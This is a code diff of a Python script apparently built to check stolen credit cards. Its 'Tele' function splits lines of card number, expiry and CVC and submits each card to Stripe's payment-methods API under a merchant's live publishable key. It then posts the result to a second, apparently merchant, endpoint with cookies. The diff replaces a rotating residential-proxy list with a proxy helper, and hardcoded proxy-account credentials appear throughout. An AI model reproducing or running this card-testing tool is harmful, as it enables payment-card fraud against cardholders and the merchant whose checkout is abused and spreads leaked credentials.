@@ -1,29 +1,26 @@
 import requests,re
-def Tele(ccx):
-	import requests
-	ccx=ccx.strip()
-	n = ccx.split("|")[0]
-	mm = ccx.split("|")[1]
-	yy = ccx.split("|")[2]
-	cvc = ccx.split("|")[3]
-	if "20" in yy:#Mo3gza
-		yy = yy.split("20")[1]
-	r = requests.session()
+from proxy import reqproxy, make_request
+def Tele(cc_data):
+	# For proxy IP
+	proxy_str = "brd.superproxy.io:33335:brd-customer-hl_37c42edc-zone-yg69:0265kxd56ii6"
+	session, ip = reqproxy(proxy_str)
+	print(f"IP Address: {ip}")
+	# For own IP
+	# url = "https://httpbin.org/get"
+	# make_request(url)
 
-	proxy_list = [
-    "brd.superproxy.io:33335:brd-customer-hl_37c42edc-zone-yg69:0265kxd56ii6",
-    "brd.superproxy.io:33335:brd-customer-hl_37c42edc-zone-yg69:0265kxd56ii6",
-    "brd.superproxy.io:33335:brd-customer-hl_37c42edc-zone-yg69:0265kxd56ii6",
-    "brd.superproxy.io:33335:brd-customer-hl_37c42edc-zone-yg69:0265kxd56ii6",
-    "brd.superproxy.io:33335:brd-customer-hl_37c42edc-zone-yg69:0265kxd56ii6",
-]
+	try:        
+		cc_data = cc_data.strip().split('|')
+		if len(cc_data) != 4:
+			raise ValueError(f"Unexpected format for card data: {cc_data}")
+        
+		n, mm, yy, cvc = map(str.strip, cc_data)
+		if yy.startswith("20"):
+			yy = yy[2:]
 
-# Function to randomly select a proxy
-def get_random_proxy():
-	proxy = random.choice(proxy_list)
-	ip, port, username, password = proxy.split(":")
-	proxy_auth = f"http://{username}:{password}@{ip}:{port}"
-	return {"http": proxy_auth, "https": proxy_auth}
+	except ValueError as e:
+		print(f"Error processing card: {e}")
+		return None  # Exit function in case of error
 	
 	headers = {
 	    'authority': 'api.stripe.com',
@@ -43,24 +40,9 @@ def get_random_proxy():
 	
 	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F4901af2b6b%3B+stripe-js-v3%2F4901af2b6b%3B+card-element&key=pk_live_51MyWZrJ52F9ZB0n07Hd0bDZxUwGNghNCcFDPnibONN3Wa9Vvj4yfQp3ZoA3WMGtuICDDH2nCezFYUFeJnhiwyXTw00gsD6iHLJ'
 	
-	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, proxies=proxy, timeout=30)
+	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 	
 	pm = r1.json()['id']
-	
-	proxy_list = [
-    "brd.superproxy.io:33335:brd-customer-hl_37c42edc-zone-yg69:0265kxd56ii6",
-    "brd.superproxy.io:33335:brd-customer-hl_37c42edc-zone-yg69:0265kxd56ii6",
-    "brd.superproxy.io:33335:brd-customer-hl_37c42edc-zone-yg69:0265kxd56ii6",
-    "brd.superproxy.io:33335:brd-customer-hl_37c42edc-zone-yg69:0265kxd56ii6",
-    "brd.superproxy.io:33335:brd-customer-hl_37c42edc-zone-yg69:0265kxd56ii6",
-]
-
-# Function to randomly select a proxy
-def get_random_proxy():
-	proxy = random.choice(proxy_list)
-	ip, port, username, password = proxy.split(":")
-	proxy_auth = f"http://{username}:{password}@{ip}:{port}"
-	return {"http": proxy_auth, "https": proxy_auth}
 	
 	cookies = {
 	    'cookielawinfo-checkbox-necessary': 'yes',
@@ -105,8 +87,6 @@ def get_random_proxy():
 	    cookies=cookies,
 	    headers=headers,
 	    data=data,
-	    proxies=proxy,
-	    timeout=30,
 	)
 	
 	return (r2.json())
